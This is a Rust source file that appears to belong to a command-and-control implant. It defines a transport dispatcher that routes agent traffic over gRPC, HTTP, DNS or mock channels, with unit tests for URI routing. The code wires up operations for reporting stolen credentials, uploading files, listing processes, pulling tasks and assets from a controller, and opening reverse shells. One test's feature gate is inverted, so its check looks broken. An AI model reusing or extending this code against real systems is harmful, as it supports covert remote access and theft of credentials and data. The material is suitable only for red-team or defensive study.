use anyhow::{anyhow, Result};
use pb::c2::*;
use std::sync::mpsc::{Receiver, Sender};

#[cfg(feature = "grpc")]
mod grpc;
#[cfg(feature = "grpc")]
pub use grpc::GRPC;

#[cfg(feature = "grpc-doh")]
mod dns_resolver;
#[cfg(feature = "grpc-doh")]
pub use dns_resolver::doh::DohProvider;

#[cfg(feature = "http1")]
mod http;

#[cfg(feature = "dns")]
mod dns;

#[cfg(feature = "mock")]
mod mock;
#[cfg(feature = "mock")]
pub use mock::MockTransport;

mod transport;
pub use transport::Transport;

#[derive(Clone)]
pub enum ActiveTransport {
    #[cfg(feature = "grpc")]
    Grpc(grpc::GRPC),
    #[cfg(feature = "http1")]
    Http(http::HTTP),
    #[cfg(feature = "dns")]
    Dns(dns::DNS),
    #[cfg(feature = "mock")]
    Mock(mock::MockTransport),
    Empty,
}

impl Transport for ActiveTransport {
    fn init() -> Self {
        Self::Empty
    }

    fn new(uri: String, proxy_uri: Option<String>) -> Result<Self> {
        match uri {
            // 1. gRPC: Passthrough
            s if s.starts_with("http://") || s.starts_with("https://") => {
                #[cfg(feature = "grpc")]
                return Ok(ActiveTransport::Grpc(grpc::GRPC::new(s, proxy_uri)?));
                #[cfg(not(feature = "grpc"))]
                return Err(anyhow!("gRPC transport not enabled"));
            }

            // 2. gRPC: Rewrite (Order: longest match 'grpcs' first)
            s if s.starts_with("grpc://") || s.starts_with("grpcs://") => {
                #[cfg(feature = "grpc")]
                {
                    let new = s
                        .replacen("grpcs://", "https://", 1)
                        .replacen("grpc://", "http://", 1);
                    Ok(ActiveTransport::Grpc(grpc::GRPC::new(new, proxy_uri)?))
                }
                #[cfg(not(feature = "grpc"))]
                return Err(anyhow!("gRPC transport not enabled"));
            }

            // 3. HTTP1: Rewrite
            s if s.starts_with("http1://") || s.starts_with("https1://") => {
                #[cfg(feature = "http1")]
                {
                    let new = s
                        .replacen("https1://", "https://", 1)
                        .replacen("http1://", "http://", 1);
                    Ok(ActiveTransport::Http(http::HTTP::new(new, proxy_uri)?))
                }
                #[cfg(not(feature = "http1"))]
                return Err(anyhow!("http1 transport not enabled"));
            }

            // 4. DNS
            s if s.starts_with("dns://") => {
                #[cfg(feature = "dns")]
                {
                    Ok(ActiveTransport::Dns(dns::DNS::new(s, proxy_uri)?))
                }
                #[cfg(not(feature = "dns"))]
                return Err(anyhow!("DNS transport not enabled"));
            }

            _ => Err(anyhow!("Could not determine transport from URI: {}", uri)),
        }
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.claim_tasks(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.claim_tasks(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.claim_tasks(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.claim_tasks(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.fetch_asset(request, sender).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.fetch_asset(request, sender).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_credential(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_credential(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_credential(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_credential(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_file(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_file(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_file(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_file(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_process_list(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_process_list(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_process_list(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_process_list(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.report_task_output(request).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.report_task_output(request).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.report_task_output(request).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.report_task_output(request).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "http1")]
            Self::Http(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.reverse_shell(rx, tx).await,
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.reverse_shell(rx, tx).await,
            Self::Empty => Err(anyhow!("Transport not initialized")),
        }
    }

    fn get_type(&mut self) -> beacon::Transport {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.get_type(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.get_type(),
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.get_type(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.get_type(),
            Self::Empty => beacon::Transport::Unspecified,
        }
    }

    fn is_active(&self) -> bool {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.is_active(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.is_active(),
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.is_active(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.is_active(),
            Self::Empty => false,
        }
    }

    fn name(&self) -> &'static str {
        match self {
            #[cfg(feature = "grpc")]
            Self::Grpc(t) => t.name(),
            #[cfg(feature = "http1")]
            Self::Http(t) => t.name(),
            #[cfg(feature = "dns")]
            Self::Dns(t) => t.name(),
            #[cfg(feature = "mock")]
            Self::Mock(t) => t.name(),
            Self::Empty => "none",
        }
    }

    #[allow(clippy::vec_init_then_push)]
    fn list_available(&self) -> Vec<String> {
        let mut list = Vec::new();
        #[cfg(feature = "grpc")]
        list.push("grpc".to_string());
        #[cfg(feature = "http1")]
        list.push("http".to_string());
        #[cfg(feature = "dns")]
        list.push("dns".to_string());
        #[cfg(feature = "mock")]
        list.push("mock".to_string());
        list
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    #[cfg(feature = "grpc")]
    async fn test_routes_to_grpc_transport() {
        // All these prefixes should result in the Grpc variant
        let inputs = vec![
            // Passthrough cases
            "http://127.0.0.1:50051",
            "https://127.0.0.1:50051",
            // Rewrite cases
            "grpc://127.0.0.1:50051",
            "grpcs://127.0.0.1:50051",
        ];

        for uri in inputs {
            let result = ActiveTransport::new(uri.to_string(), None);

            // 1. Assert strictly on the Variant type
            assert!(
                matches!(result, Ok(ActiveTransport::Grpc(_))),
                "URI '{}' did not resolve to ActiveTransport::Grpc",
                uri
            );
        }
    }

    #[tokio::test]
    #[cfg(not(feature = "http1"))]
    async fn test_routes_to_http1_transport() {
        // All these prefixes should result in the Http1 variant
        let inputs = vec!["http1://127.0.0.1:8080", "https1://127.0.0.1:8080"];

        for uri in inputs {
            let result = ActiveTransport::new(uri.to_string(), None);

            assert!(
                matches!(result, Ok(ActiveTransport::Http(_))),
                "URI '{}' did not resolve to ActiveTransport::Http",
                uri
            );
        }
    }

    #[tokio::test]
    #[cfg(feature = "dns")]
    async fn test_routes_to_dns_transport() {
        // DNS URIs should result in the Dns variant
        let inputs = vec![
            "dns://8.8.8.8:53?domain=example.com",
            "dns://*?domain=example.com&type=txt",
            "dns://1.1.1.1?domain=test.com&type=a",
        ];

        for uri in inputs {
            let result = ActiveTransport::new(uri.to_string(), None);

            assert!(
                matches!(result, Ok(ActiveTransport::Dns(_))),
                "URI '{}' did not resolve to ActiveTransport::Dns",
                uri
            );
        }
    }

    #[tokio::test]
    #[cfg(not(feature = "grpc"))]
    async fn test_grpc_disabled_error() {
        // If the feature is off, these should error out
        let inputs = vec!["grpc://foo", "grpcs://foo", "http://foo"];
        for uri in inputs {
            let result = ActiveTransport::new(uri.to_string(), None);
            assert!(
                result.is_err(),
                "Expected error for '{}' when gRPC feature is disabled",
                uri
            );
        }
    }

    #[tokio::test]
    async fn test_unknown_transport_errors() {
        let inputs = vec!["ftp://example.com", "ws://example.com", "random-string", ""];

        for uri in inputs {
            let result = ActiveTransport::new(uri.to_string(), None);
            assert!(
                result.is_err(),
                "Expected error for unknown URI scheme: '{}'",
                uri
            );
        }
    }
}
